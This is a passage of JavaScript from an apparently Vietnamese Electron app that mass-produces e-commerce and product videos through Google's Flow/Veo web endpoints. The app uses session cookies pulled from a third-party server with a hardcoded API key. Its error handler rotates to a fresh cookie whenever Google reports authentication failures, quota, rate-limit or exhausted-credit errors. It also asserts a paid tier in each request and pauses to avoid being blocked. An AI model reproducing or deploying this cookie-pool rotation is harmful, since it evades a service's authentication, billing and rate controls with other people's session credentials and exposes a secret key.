            requests: [{
              startImage: { mediaId: frameMediaId },
              aspectRatio: `VIDEO_ASPECT_RATIO_${aspectRatio}`,
              seed: Math.floor(Math.random() * 1e5),
              textInput: { structuredPrompt: { parts: [{ text: prompts[pIdx] }] } },
              metadata: { sceneId },
              videoModelKey: veoModelKey
            }],
            useV2ModelConfig: true
          };
          // const genRes = await We(null, { url: "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoStartImage", cookie: poolItem.cookie, options: { method: "POST", body: payload } });
          const genRes = await We(null, { url: "https://flow.google.com/v1/video:batchAsyncGenerateVideoStartImage", cookie: poolItem.cookie, options: { method: "POST", body: payload } });
          const workflow = genRes?.workflows?.[0];
          const media = genRes?.media?.[0];
          const op = media?.name || workflow?.name || genRes?.media?.[0]?.operation?.name;
          if (!op) {
            console.error("[AutoProduct] Lỗi khởi tạo:", JSON.stringify(genRes));
            let errDetail = genRes?.error?.message || genRes?.statusDetail || "API Veo không trả về ID tiến trình.";
            if (JSON.stringify(genRes).includes("SAFETY")) {
              errDetail = "Vi phạm chính sách an toàn của Google. Hãy sửa lại Prompt hoặc ảnh sản phẩm.";
            }
            throw new Error(`Lỗi khởi tạo: ${errDetail}`);
          }
          return op;
        });

        let videoUrl = null;
        while (true) {
          if ($e || Qe) throw new Error("Đã dừng.");
          await cancellableSleep(40000);

          const checkRes = await executeWithPool(prodId, "Check tiến trình", "video", poolIndex, async (poolItem) => {
            // return await We(null, { url: "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus", cookie: poolItem.cookie, options: { method: "POST", body: { media: [{ name: opName, projectId: poolItem.projectId || poolItem.vidProjectId || poolItem.imgProjectId }] } } });
            return await We(null, { url: "https://flow.google.com/v1/video:batchCheckAsyncVideoGenerationStatus", cookie: poolItem.cookie, options: { method: "POST", body: { media: [{ name: opName, projectId: poolItem.projectId || poolItem.vidProjectId || poolItem.imgProjectId }] } } });
          });


          console.log("[Extended Video] checkRes:", JSON.stringify(checkRes).substring(0, 500));
          const opStatus = checkRes?.media?.[0] || checkRes?.media?.[0] || checkRes;

          const statusStr = (opStatus?.status || opStatus?.mediaMetadata?.mediaStatus?.mediaGenerationStatus || opStatus?.mediaStatus?.mediaGenerationStatus || "").toUpperCase();

          if (statusStr === "MEDIA_GENERATION_STATUS_SUCCESSFUL") {
            const vidMeta = opStatus.operation?.metadata?.video || opStatus.video || checkRes.video;
            videoUrl = vidMeta?.fifeUrl || vidMeta?.servingBaseUri || vidMeta?.generatedVideo?.fifeUrl || vidMeta?.generatedVideo?.servingBaseUri;
            if (!videoUrl) {
              try {
                // Dynamically get mediaId from available variables (S, m, checkRes, etc)
                let mId = "";
                if (typeof opStatus !== 'undefined') mId = opStatus.operation?.name || opStatus.name;
                if (!mId && typeof checkRes !== 'undefined') mId = checkRes?.media?.[0]?.name;
                if (!mId && typeof S !== 'undefined') mId = S?.operation?.name || S?.name;
                if (!mId && typeof m !== 'undefined') mId = m?.operation?.name || m?.name;

                if (mId) {
                  const fetchFn = global.fetch || require("node-fetch");
                  // Find available cookie variable
                  let cVal = "";
                  if (typeof poolItem !== 'undefined' && poolItem && poolItem.cookie) cVal = poolItem.cookie;
                  else if (typeof cookie !== 'undefined') cVal = cookie;
                  else if (typeof c !== 'undefined') cVal = c;
                  else if (typeof h !== 'undefined') cVal = h;

                  if (typeof cVal === "object") cVal = cVal.value;


                  console.log("[Redirect Debug] Cookie length:", typeof cVal !== "undefined" && cVal ? cVal.length : 0);
                  const redirectRes = await flowMediaRedirectResponse(mId, cVal);
                  if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                    videoUrl = redirectRes.headers.get("location");
                  } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                    videoUrl = redirectRes.url;
                  } else {
                    try {
                      const cValStr = (typeof cVal === "object" && cVal) ? (cVal.value || "") : (cVal || "");
                      const signed = await fetchFlowMediaSignedUrl(mId, cValStr);
                      if (signed) { videoUrl = signed; console.log("[Redirect] as29s fallback lay URL:", signed); }
                    } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
                  }
                }
              } catch (e) {
                console.error("Lỗi Redirect API:", e);
              }
            }

            break;
          } else if (statusStr === "MEDIA_GENERATION_STATUS_FAILED") {
            console.error(`[AutoProduct] Chi tiết lỗi FAILED:`, JSON.stringify(opStatus));
            let detail = opStatus.error?.message || opStatus.mediaStatus?.statusDetail || "Lỗi render video từ Veo.";
            if (JSON.stringify(opStatus).includes("SAFETY")) {
              detail = "Vi phạm chính sách an toàn của Google trong quá trình render.";
            }
            throw new Error(`Lỗi Veo API: ${detail}`);
          }
        }

        if (!videoUrl) throw new Error("Mất URL video.");
        const vidPath = ye.join(tempDir, `p_${prodId}_v_${pIdx}.mp4`);
        const fetchFn = global.fetch || require("node-fetch");
        const vidBuffer = await (await fetchFn(videoUrl)).arrayBuffer();
        await be.promises.writeFile(vidPath, Buffer.from(vidBuffer));
        generatedVideoPaths.push(vidPath);

        completedPromptIndexes.push(pIdx);
        cachedData.generatedVideoPaths = generatedVideoPaths;
        cachedData.completedPromptIndexes = completedPromptIndexes;
        global.autoProductCache.set(prodId, cachedData);

        if (pIdx < prompts.length - 1) {
          sendLog(prodId, `Đang trích xuất frame chuyển cảnh...`, "video");
          const frameTarget = ye.join(tempDir, `p_${prodId}_f_${pIdx}.jpg`);
          await new Promise((resolve, reject) => {
            jo(vidPath)
              .inputOptions(["-sseof", "-0.1"])
              .outputOptions([
                "-vframes", "1",
                "-f", "image2",
                "-q:v", "2",
                "-pix_fmt", "yuvj420p",
                "-y"
              ])
              .save(frameTarget).on("end", () => resolve()).on("error", err => reject(err));
          });
          currentLastFrameBase64 = (await be.promises.readFile(frameTarget)).toString("base64");
          cachedData.currentLastFrameBase64 = currentLastFrameBase64;
          global.autoProductCache.set(prodId, cachedData);

          await cancellableSleep(4000); // Nghỉ chống block
        }
      }

      sendLog(prodId, "B3: Đang nối chuỗi video...", "merging");
      let finalPath;
      if (autoSaveConfig.enabled && autoSaveConfig.path) {
        if (!be.existsSync(autoSaveConfig.path)) be.mkdirSync(autoSaveConfig.path, { recursive: true });
        finalPath = ye.join(autoSaveConfig.path, `AutoProduct_${Date.now()}.mp4`);
      } else {
        finalPath = ye.join(he.app.getPath("downloads"), `AutoProduct_${Date.now()}.mp4`);
      }

      const listPath = ye.join(tempDir, `list_${prodId}.txt`);
      be.writeFileSync(listPath, generatedVideoPaths.map(f => `file '${f.replace(/\\/g, "/").replace(/'/g, "'\\''")}'`).join("\n"));

      await new Promise((res, rej) => { jo().input(listPath).inputOptions(["-f", "concat", "-safe", "0"]).outputOptions(["-c:v", "libx264", "-preset", "fast", "-crf", "18", "-pix_fmt", "yuv420p", "-vsync", "vfr", "-c:a", "aac", "-b:a", "192k"]).save(finalPath).on("end", res).on("error", rej); });

      sendLog(prodId, "Video hoàn chỉnh!", "success", finalPath);
      // Giữ lại ảnh gốc (currentLastFrameBase64) nhưng reset các mốc video để tạo lại video mới nếu ấn Thử lại
      cachedData.completedPromptIndexes = [];
      global.autoProductCache.set(prodId, cachedData);
    } catch (error) {
      if ($e || Qe) {
        sendLog(prodId, "Đã dừng.", "idle");
        throw error; // bubble lên để retry wrapper biết là dừng chủ động
      }
      throw error; // bubble lên để retry wrapper xử lý
    }
  };

  // Wrapper tự động retry khi gặp lỗi (tối đa 5 lần, delay tăng dần)
  const processProductWithRetry = async (item, poolIndex) => {
    const MAX_RETRIES = 3;
    for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
      if ($e || Qe) return; // Đã bấm dừng thì thoát hẳn
      try {
        await processProduct(item, poolIndex);
        return; // Thành công thì xong
      } catch (error) {
        if ($e || Qe) {
          // Người dùng chủ động dừng, không cần retry
          sendLog(item.id, "Đã dừng.", "idle");
          return;
        }
        if (attempt < MAX_RETRIES) {
          const delaySeconds = attempt * 10; // 10s, 20s, 30s, 40s...
          sendLog(item.id, `ERROR: ${String(error.message || "ERROR").split(":")[0]}`, "failed");
          await new Promise(r => setTimeout(r, delaySeconds * 1000));
        } else {
          // Hết lần retry, báo failed
          sendLog(item.id, `ERROR: ${String(error.message || "ERROR").split(":")[0]}`, "failed");
        }
      }
    }
  };

  const queue = [...products];
  let activeWorkers = 0;
  let workerIdCounter = 0;
  const runNext = () => {
    if ($e || Qe) { queue.length = 0; return; }
    if (queue.length === 0 && activeWorkers === 0) {
      try { if (be.existsSync(tempDir)) be.rmSync(tempDir, { recursive: true, force: true }); } catch (e) { }
      return;
    }
    while (queue.length > 0 && activeWorkers < concurrentStreams) {
      const item = queue.shift();
      activeWorkers++;
      const assignedCookieIndex = workerIdCounter % (global.veoCookieCache.length || 1);
      workerIdCounter++;
      processProductWithRetry(item, assignedCookieIndex).finally(() => { activeWorkers--; setTimeout(runNext, 2000); });
    }
  };
  runNext();
});

// --- AI COMMERCE VIDEO MAKER (VIDEO TMĐT AI) ---
he.ipcMain.on("commerce:stop-tasks", () => {
  console.log("[Commerce] Nhận lệnh dừng task TMĐT.");
  $e = true;
  Qe = true;
  abortCurrentSession();
});

he.ipcMain.on("commerce:start-tasks", async (event, args) => {
  const tasks = args.tasks || [];
  const kolImage = args.kolImage || null;
  const aspectRatio = args.aspectRatio || "PORTRAIT";
  const imageModel = args.imageModel || args.model || "GEM_PIX_2";
  const concurrency = Math.max(1, Math.min(5, args.concurrency || 2));
  const autoSaveConfig = args.autoSaveConfig || {};
  const authToken = args.authToken || (args.currentUser && args.currentUser.token);
  let activeCookie = args.activeCookie || (args.cookies && args.cookies.length > 0 ? args.cookies[0] : null);

  console.log(`[Commerce] Bắt đầu chạy ${tasks.length} task TMĐT với ${concurrency} luồng...`);

  $e = false;
  Qe = false;
  newSessionAbortController();

  if (global.bananaFrontendUploadCache) global.bananaFrontendUploadCache.clear();
  threadTokenCache.clear();

  const sendLog = (promptId, message, status, videoUrl = null, thumbnail = null) => {
    if (($e || Qe) && status !== "idle" && status !== "failed") return;
    he.BrowserWindow.getAllWindows().forEach((win) => {
      if (!win.isDestroyed()) {
        win.webContents.send("browser:log", {
          promptId,
          message,
          status,
          videoUrl,
          thumbnail
        });
      }
    });
  };

  if (!authToken) {
    sendLog(null, "Lỗi: Chưa đăng nhập hoặc thiếu token tài khoản.", "failed");
    return;
  }

  // --- QUẢN LÝ COOKIE POOL ---
  const fetchNewCookieFromServer = async (reason = "") => {
    try {
      const fetchFn = global.fetch || require("node-fetch");
      const res = await (await fetchFn(kinxCookieUrl(reason), {
        headers: { "X-API-Key": "kinx@0$*2048", Authorization: `Bearer ${authToken}` },
      })).json();
      if (res.success && res.cookie) return res.cookie;
      throw new Error("Server không trả về cookie hợp lệ.");
    } catch (err) {
      throw new Error(`Lỗi lấy cookie: ${err.message}`);
    }
  };

  const initProjectForCookie = async (cookie, index) => {
    try {
      const projectId = await flowCreateProject(authToken, flowDefaultProjectTitle(), cookie);
      console.log(`[Commerce Init] Tạo Flow project thành công: ${projectId}`);
      return projectId;
    } catch (err) {
      throw new Error(`Không tạo được project Flow (Cookie lỗi/401): ${err.message}`);
    }
  };

  const prepareCookiePool = async () => {
    global.veoCookieCache = [];
    const requiredCookies = 1;
    let initAttempts = 0;

    while (global.veoCookieCache.length < requiredCookies) {
      if ($e || Qe) break;
      const idx = global.veoCookieCache.length + 1;
      sendLog(null, `[Khởi tạo] Đang chuẩn bị phiên làm việc #${idx}...`, "processing");
      try {
        let newCookie;
        const hasActiveLocal = activeCookie && (typeof activeCookie === 'string' ? activeCookie.trim().length > 10 : activeCookie.value && activeCookie.value.trim().length > 10);
        try {
          newCookie = await fetchNewCookieFromServer(initAttempts > 0 ? "401" : "");
          sendLog(null, `[Khởi tạo] Lấy Cookie từ Server thành công (Ưu tiên Server).`, "success");
        } catch (serverErr) {
          if (hasActiveLocal) {
            newCookie = activeCookie;
            sendLog(null, `[Khởi tạo] Server lỗi, dùng Cookie Local dự phòng.`, "warning");
          } else {
            throw serverErr;
          }
        }
        const projectId = await initProjectForCookie(newCookie, idx);
        global.veoCookieCache.push({
          cookie: newCookie,
          projectId,
          imgProjectId: projectId,
          vidProjectId: projectId,
          timestamp: Date.now(),
          id: `pool-comm-${idx}-${Date.now()}`
        });
        initAttempts = 0;
      } catch (err) {
        initAttempts++;
        sendLog(null, `Lỗi chuẩn bị phiên #${idx}: ${err.message} (${initAttempts}/3)...`, "error");
        if (initAttempts >= 3) {
          sendLog(null, "ERROR: Không thể chuẩn bị cookie/project.", "failed");
          return false;
        }
        await cancellableSleep(2000);
      }
    }
    return global.veoCookieCache.length >= requiredCookies;
  };

  const refreshCookieInPool = async (poolIndex, reason = "") => {
    if ($e || Qe) return false;
    try {
      const newCookie = await fetchNewCookieFromServer(reason);
      if ($e || Qe) return false;
      const projectId = await initProjectForCookie(newCookie, poolIndex);
      if ($e || Qe) return false;
      global.veoCookieCache[poolIndex] = {
        cookie: newCookie,
        projectId,
        imgProjectId: projectId,
        vidProjectId: projectId,
        timestamp: Date.now(),
        id: `pool-comm-${poolIndex}-${Date.now()}`
      };
      return true;
    } catch (err) {
      return false;
    }
  };

  let poolReady = false;
  try {
    poolReady = await prepareCookiePool();
  } catch (pe) {
    console.warn("[Commerce] Lỗi prepareCookiePool:", pe.message);
  }
  if (!poolReady && (!global.veoCookieCache || global.veoCookieCache.length === 0)) {
    sendLog(null, "ERROR: Không thể chuẩn bị phiên kết nối Google.", "failed");
    return;
  }

  // TRUNG TÂM XỬ LÝ LỖI VÀ ROTATE COOKIE
  const executeWithPool = async (taskId, logPrefix, statusFlag, poolIndex, actionFn) => {
    let attempts = 0;
    while (true) {
      if ($e || Qe) throw new Error("Đã dừng bởi người dùng.");
      attempts++;

      const safeIndex = poolIndex % (global.veoCookieCache.length || 1);
      let poolItem = global.veoCookieCache[safeIndex];

      if (!poolItem || !poolItem.cookie) {
        await refreshCookieInPool(safeIndex);
        poolItem = global.veoCookieCache[safeIndex];
        if (!poolItem) {
          await cancellableSleep(4000);
          continue;
        }
      }

      try {
        return await actionFn(poolItem);
      } catch (err) {
        if ($e || Qe || String(err.message || "").includes("SESSION_STOPPED")) throw new Error("Đã dừng bởi người dùng.");
        const em0 = (err.message || "").toLowerCase();
        if (em0.includes("safety") || em0.includes("unsafe") || em0.includes("filtered") || em0.includes("vi phạm") || em0.includes("public_error_audio_filtered")) {
          sendLog(taskId, "Lỗi Vi phạm chính sách an toàn của Google", "failed");
          throw new Error("Vi phạm chính sách an toàn");
        }

        const errMsg = em0 + " " + String(err).toLowerCase();
        let waitTime = 3000;

        const shouldRotateCookie = errMsg.includes("401") || errMsg.includes("unauthenticated") || errMsg.includes("429") || errMsg.includes("quota") || errMsg.includes("resource_exhausted") || errMsg.includes("rate limit") || errMsg.includes("throttled") || errMsg.includes("credit") || errMsg.includes("tín dụng") || errMsg.includes("insufficient");
        if (shouldRotateCookie) {
          sendLog(taskId, `[${logPrefix}] Cookie lỗi hoặc quota, đang đổi phiên và thử lại...`, statusFlag);
          await refreshCookieInPool(safeIndex, (errMsg.includes("401") || errMsg.includes("unauthenticated")) ? "401" : "429");
          if (errMsg.includes("429") || errMsg.includes("quota") || errMsg.includes("resource_exhausted") || errMsg.includes("rate limit") || errMsg.includes("throttled")) waitTime = 10000;
          if (attempts >= 3) throw new Error("ERROR: " + (err.message || "Quá số lần thử lại"));
          await cancellableSleep(waitTime);
        } else {
          if (attempts >= 3) throw new Error("ERROR: " + (err.message || err.statusCode || "Lỗi xử lý"));
          await cancellableSleep(2000);
        }
      }
    }
  };

  // HÀM XỬ LÝ 1 TASK TMĐT
  const processTask = async (task, poolIndex) => {
    const taskId = task.id;
    try {
      if ($e || Qe) return;
      sendLog(taskId, "Bắt đầu xử lý...", "processing");

      const sessionBase = `;${Date.now()}`;

      // 1. TẢI ẢNH KOL VÀ ẢNH SẢN PHẨM
      let kolMediaId = null;
      if (kolImage) {
        sendLog(taskId, "Đang tải ảnh KOL...", "processing");
        kolMediaId = await executeWithPool(taskId, "Tải ảnh KOL", "processing", poolIndex, async (poolItem) => {
          const cacheKey = `${poolItem.projectId}_${_r.createHash("md5").update(kolImage.substring(0, 1000)).digest("hex")}`;
          if (global.uploadedImageCache.has(cacheKey)) {
            const c = global.uploadedImageCache.get(cacheKey);
            return typeof c === "string" ? c : await c;
          }
          const upPromise = bo(null, kolImage, poolItem.cookie, taskId, poolItem.projectId, "browser:log");
          global.uploadedImageCache.set(cacheKey, upPromise);
          const mid = await upPromise;
          if (mid) global.uploadedImageCache.set(cacheKey, mid);
          else global.uploadedImageCache.delete(cacheKey);
          return mid;
        });
      }

      let prodMediaId = null;
      if (task.imageBase64) {
        sendLog(taskId, "Đang tải ảnh sản phẩm...", "processing");
        prodMediaId = await executeWithPool(taskId, "Tải ảnh SP", "processing", poolIndex, async (poolItem) => {
          const cacheKey = `${poolItem.projectId}_${_r.createHash("md5").update(task.imageBase64.substring(0, 1000)).digest("hex")}`;
          if (global.uploadedImageCache.has(cacheKey)) {
            const c = global.uploadedImageCache.get(cacheKey);
            return typeof c === "string" ? c : await c;
          }
          const upPromise = bo(null, task.imageBase64, poolItem.cookie, taskId, poolItem.projectId, "browser:log");
          global.uploadedImageCache.set(cacheKey, upPromise);
          const mid = await upPromise;
          if (mid) global.uploadedImageCache.set(cacheKey, mid);
          else global.uploadedImageCache.delete(cacheKey);
          return mid;
        });
      }

      // 2. GIAI ĐOẠN TẠO ẢNH (NANO BANANA 2 / GEM_PIX_2)
      sendLog(taskId, "Đang xử lý mẫu...", "processing");

      const imageInputs = [];
      if (kolMediaId) imageInputs.push({ name: kolMediaId, imageInputType: "IMAGE_INPUT_TYPE_REFERENCE" });
      if (prodMediaId) imageInputs.push({ name: prodMediaId, imageInputType: "IMAGE_INPUT_TYPE_REFERENCE" });

      const designPrompt = task.prompt?.trim() || "A high quality commercial product photography seamlessly blending the character and the product. Cinematic lighting, photorealistic, 8k resolution.";

      const targetAspect = task.aspectRatio || aspectRatio;
      const isPortrait = /PORTRAIT|9:16|9_16/i.test(String(targetAspect || ""));
      const aspectEnum = isPortrait ? "PORTRAIT" : "LANDSCAPE";
      console.log(`[Commerce] Task ${taskId} targetAspect: "${targetAspect}" -> aspectEnum: ${aspectEnum}`);

      const genImgResult = await executeWithPool(taskId, "Tạo ảnh", "processing", poolIndex, async (poolItem) => {
        const getOrUploadRef = async (b64Data) => {
          const cacheKey = `${poolItem.projectId}_${_r.createHash("md5").update(b64Data.substring(0, 1000)).digest("hex")}`;
          if (global.uploadedImageCache.has(cacheKey)) {
            const c = global.uploadedImageCache.get(cacheKey);
            return typeof c === "string" ? c : await c;
          }
          const upPromise = bo(null, b64Data, poolItem.cookie, taskId, poolItem.projectId, "browser:log");
          global.uploadedImageCache.set(cacheKey, upPromise);
          const mid = await upPromise;
          if (mid) global.uploadedImageCache.set(cacheKey, mid);
          else global.uploadedImageCache.delete(cacheKey);
          return mid;
        };

        const curImageInputs = [];
        if (kolImage) {
          const curKolId = await getOrUploadRef(kolImage) || kolMediaId;
          if (curKolId) curImageInputs.push({ name: curKolId, imageInputType: "IMAGE_INPUT_TYPE_REFERENCE" });
        }
        if (task.imageBase64) {
          const curProdId = await getOrUploadRef(task.imageBase64) || prodMediaId;
          if (curProdId) curImageInputs.push({ name: curProdId, imageInputType: "IMAGE_INPUT_TYPE_REFERENCE" });
        }

        const selectedImageModel = task.imageModel || imageModel || "GEM_PIX_2";
        const payload = {
          clientContext: {
            sessionId: sessionBase,
            projectId: poolItem.projectId,
            tool: "IMAGE_FX",
            userPaygateTier: "PAYGATE_TIER_TWO"
          },
          requests: [{
            clientContext: {
              sessionId: sessionBase,
              projectId: poolItem.projectId,
              tool: "IMAGE_FX",
              userPaygateTier: "PAYGATE_TIER_TWO"
            },
            seed: Math.floor(Math.random() * 1e6),
            imageModelName: selectedImageModel,
            imageAspectRatio: `IMAGE_ASPECT_RATIO_${aspectEnum}`,
            prompt: designPrompt,
            structuredPrompt: { parts: [{ text: designPrompt }] },
            imageInputs: curImageInputs
          }]
        };

        const res = await We(null, {
          // url: `https://aisandbox-pa.googleapis.com/v1/projects/${poolItem.projectId}/flowMedia:batchGenerateImages`,
          url: `https://flow.google.com/v1/projects/${poolItem.projectId}/flowMedia:batchGenerateImages`,
          cookie: poolItem.cookie,
          options: {
            method: "POST",
            body: payload
          }
        });

        let b64 = res?.media?.[0]?.image?.generatedImage?.encodedImage || res?.media?.[0]?.image?.encodedImage;
        if (!b64) {
          const fifeUrl = res?.media?.[0]?.image?.generatedImage?.fifeUrl || res?.media?.[0]?.image?.fifeUrl;
          if (fifeUrl) {
            const fetchFn = global.fetch || require("node-fetch");
            const imgFetch = await fetchFn(fifeUrl);
            const imgBuffer = await imgFetch.arrayBuffer();
            b64 = Buffer.from(imgBuffer).toString("base64");
          }
        }
        const mediaId = res?.media?.[0]?.name || res?.media?.[0]?.mediaGenerationId?.mediaGenerationId;
        if (!b64) throw new Error("API không trả về ảnh Base64: " + JSON.stringify(res).substring(0, 300));
        return { b64, mediaId, projectId: poolItem.projectId };
      });

      const genBase64 = genImgResult.b64;
      const genMediaId = genImgResult.mediaId;
      const genImgProjectId = genImgResult.projectId;
      const thumbUrl = genBase64.startsWith("data:") ? genBase64 : `data:image/jpeg;base64,${genBase64}`;

      // Báo UI ảnh đã tạo xong và hiển thị ảnh thumbnail xem trước
      sendLog(taskId, "Ảnh đã tạo xong! Chuẩn bị tạo Video...", "processing", null, thumbUrl);

      // Tự động lưu ảnh nếu cấu hình bật
      if (autoSaveConfig.autoSaveImage && autoSaveConfig.saveImagePath) {
        try {
          if (!be.existsSync(autoSaveConfig.saveImagePath)) be.mkdirSync(autoSaveConfig.saveImagePath, { recursive: true });
          const imgFile = ye.join(autoSaveConfig.saveImagePath, `comm_img_${taskId}_${Date.now()}.png`);
          be.writeFileSync(imgFile, Buffer.from(genBase64, "base64"));
          console.log(`[Commerce] Đã lưu ảnh: ${imgFile}`);
        } catch (imgErr) {
          console.warn("[Commerce] Lỗi lưu ảnh tự động:", imgErr.message);
        }
      }

      await cancellableSleep(3000); // 3 giây để người dùng xem trước

      // 3. GIAI ĐOẠN TẠO VIDEO (VEO 3.1 R2V)
      sendLog(taskId, "Đang gửi lệnh tạo Video (Veo 3.1)...", "processing", null, thumbUrl);

      const videoPromptText = (task.prompt.trim() || "A cinematic product video") + "\nNO TEXT. ABSOLUTELY NO TEXT, WATERMARKS, SIGNBOARDS, OR LETTERS IN THE VIDEO.";
      const sceneId = `uuid-${Date.now()}-${Math.random()}`;

      const opName = await executeWithPool(taskId, "Lệnh Video", "processing", poolIndex, async (poolItem) => {
        let refMediaId = (poolItem.projectId === genImgProjectId) ? genMediaId : null;
        if (!refMediaId) {
          refMediaId = await bo(null, genBase64, poolItem.cookie, taskId, poolItem.projectId, "browser:log");
        }
        if (!refMediaId) throw new Error("Không thể tải ảnh tham chiếu lên Google.");

        const videoPayload = {
          mediaGenerationContext: {
            batchId: `batch-${Date.now()}-${Math.random()}`,
            audioFailurePreference: "BLOCK_SILENCED_VIDEOS"
          },
          clientContext: {
            sessionId: sessionBase,
            projectId: poolItem.projectId,
            tool: "IMAGE_FX",
            userPaygateTier: "PAYGATE_TIER_TWO"
          },
          requests: [{
            aspectRatio: `VIDEO_ASPECT_RATIO_${aspectEnum}`,
            seed: Math.floor(Math.random() * 1e5),
            textInput: { structuredPrompt: { parts: [{ text: videoPromptText }] } },
            videoModelKey: flowFormatModelKey("veo_3_1_r2v_lite"),
            metadata: { sceneId },
            referenceImages: [{ mediaId: refMediaId, imageUsageType: "IMAGE_USAGE_TYPE_ASSET" }]
          }],
          useV2ModelConfig: true
        };

        const genRes = await We(null, {
          // url: "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoReferenceImages",
          url: "https://flow.google.com/v1/video:batchAsyncGenerateVideoReferenceImages",
          cookie: poolItem.cookie,
          options: { method: "POST", headers: {}, body: videoPayload }
        });

        const workflow = genRes?.workflows?.[0];
        const media = genRes?.media?.[0];
        const op = media?.name || workflow?.name || genRes?.operations?.[0]?.operation?.name;
        if (!op) {
          console.error("[Commerce] Lỗi Veo R2V:", JSON.stringify(genRes));
          const errDetail = genRes?.error?.message || genRes?.statusDetail || "Google từ chối tạo video.";
          throw new Error(`Lỗi Veo API: ${errDetail}`);
        }
        return op;
      });

      // 4. CHỜ VÀ CHECK TIẾN TRÌNH VIDEO
      let videoUrl = null;
      let checkCount = 0;
      while (!videoUrl) {
        if ($e || Qe) throw new Error("Đã dừng bởi người dùng.");
        checkCount++;
        sendLog(taskId, `Đang xử lý...`, "processing", null, thumbUrl);
        await cancellableSleep(30000);

        const checkRes = await executeWithPool(taskId, "Check Video", "processing", poolIndex, async (poolItem) => {
          return await We(null, {
            // url: "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus",
            url: "https://flow.google.com/v1/video:batchCheckAsyncVideoGenerationStatus",
            cookie: poolItem.cookie,
            options: {
              method: "POST",
              body: { media: [{ name: opName, projectId: poolItem.projectId }] }
            }
          });
        });

        const opStatus = checkRes?.media?.[0] || checkRes;
        const vidMeta = opStatus?.operation?.metadata?.video || opStatus?.video || checkRes?.video;
        let finalUrl = vidMeta?.fifeUrl || vidMeta?.servingBaseUri || vidMeta?.generatedVideo?.fifeUrl || vidMeta?.generatedVideo?.servingBaseUri || opStatus?.videoUrl || checkRes?.videoUrl;

        const statusStr = (
          opStatus?.status ||
          opStatus?.mediaMetadata?.mediaStatus?.mediaGenerationStatus ||
          opStatus?.mediaStatus?.mediaGenerationStatus ||
          opStatus?.operation?.metadata?.video?.mediaStatus?.mediaGenerationStatus ||
          ""
        ).toUpperCase();

        const poolItem = global.veoCookieCache[poolIndex % (global.veoCookieCache.length || 1)];
        let mId = opStatus?.operation?.name || opStatus?.name || opName;
        let cVal = poolItem?.cookie?.value || poolItem?.cookie || "";

        if (statusStr === "MEDIA_GENERATION_STATUS_SUCCESSFUL" || finalUrl) {
          if (!finalUrl && mId) {
            try {
              const redirectRes = await flowMediaRedirectResponse(mId, cVal);
              if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                finalUrl = redirectRes.headers.get("location");
              } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                finalUrl = redirectRes.url;
              } else {
                const signed = await fetchFlowMediaSignedUrl(mId, cVal);
                if (signed) finalUrl = signed;
              }
            } catch (e) {
              console.error("[Commerce] Redirect fallback error:", e.message);
            }

            if (!finalUrl) {
              try {
                const asUrl = await flowGetMediaUrl(mId, { cookieHint: cVal, projectId: poolItem.projectId, onlyVideo: true });
                if (asUrl && asUrl.includes("flow-content.google/video/")) finalUrl = asUrl;
              } catch (e) {
                console.error("[Commerce] flowGetMediaUrl fallback error:", e.message);
              }
            }
          }

          if (finalUrl) {
            console.log(`[Commerce ${taskId}] Nhận link video thành công:`, finalUrl);
            videoUrl = finalUrl;
            break;
          }
        } else if (statusStr === "MEDIA_GENERATION_STATUS_FAILED") {
          const detail = opStatus.error?.message || opStatus.mediaStatus?.statusDetail || "Google báo lỗi render.";
          throw new Error(`Veo thất bại: ${detail}`);
        } else {
          // Ngay cả khi status đang IN_PROGRESS, thử kiểm tra as29s xem video đã xong trên Flow web chưa
          if (mId) {
            try {
              const directCheckUrl = await flowGetMediaUrl(mId, { cookieHint: cVal, projectId: poolItem.projectId, onlyVideo: true });
              if (directCheckUrl && directCheckUrl.includes("flow-content.google/video/")) {
                console.log(`[Commerce ${taskId}] flowGetMediaUrl phát hiện video đã xong sớm trên web:`, directCheckUrl);
                videoUrl = directCheckUrl;
                break;
              }
            } catch (e) { }
          }
        }
      }

      // 5. TỰ ĐỘNG LƯU VIDEO NẾU BẬT
      if (autoSaveConfig.autoSaveVideo && autoSaveConfig.saveVideoPath && videoUrl) {
        try {
          if (!be.existsSync(autoSaveConfig.saveVideoPath)) be.mkdirSync(autoSaveConfig.saveVideoPath, { recursive: true });
          const vidFileName = `comm_vid_${taskId}_${Date.now()}.mp4`;
          const vidFilePath = ye.join(autoSaveConfig.saveVideoPath, vidFileName);
          const fetchFn = global.fetch || require("node-fetch");
          const vRes = await fetchFn(videoUrl);
          const vBuf = Buffer.from(await vRes.arrayBuffer());
          be.writeFileSync(vidFilePath, vBuf);
          console.log(`[Commerce] Đã lưu video: ${vidFilePath}`);
        } catch (vidErr) {
          console.warn("[Commerce] Lỗi lưu video tự động:", vidErr.message);
        }
      }

      // Báo UI thành công
      sendLog(taskId, "Tạo video hoàn tất!", "success", videoUrl, thumbUrl);
    } catch (err) {
      if ($e || Qe || String(err.message || "").includes("SESSION_STOPPED") || String(err.message || "").includes("Đã dừng")) {
        sendLog(taskId, "Đã dừng.", "idle");
        return;
      }
      console.error(`[Commerce ${taskId}] Lỗi:`, err.message);
      sendLog(taskId, `Lỗi: ${err.message}`, "failed");
    }
  };

  // 6. CHẠY TUẦN TỰ VÀ ĐỒNG THỜI VỚI WORKER POOL
  const queue = [...tasks];
  let activeWorkers = 0;
  let workerIdCounter = 0;

  const runNext = () => {
    if ($e || Qe) {
      queue.length = 0;
      return;
    }
    if (queue.length === 0 && activeWorkers === 0) {
      sendLog(null, "Tất cả task Video TMĐT đã hoàn tất!", "idle");
      return;
    }
    while (queue.length > 0 && activeWorkers < concurrency) {
      const task = queue.shift();
      activeWorkers++;
      const assignedIndex = workerIdCounter % (global.veoCookieCache.length || 1);
      workerIdCounter++;
      processTask(task, assignedIndex).finally(() => {
        activeWorkers--;
        setTimeout(runNext, 1000);
      });
    }
  };

  runNext();
});

const Je = (a, i, c, h = null) => {
  qe &&
    !qe.isDestroyed() &&
    qe.webContents.send("extended-video:log", {
      promptId: a,
      message: i,
      status: c,
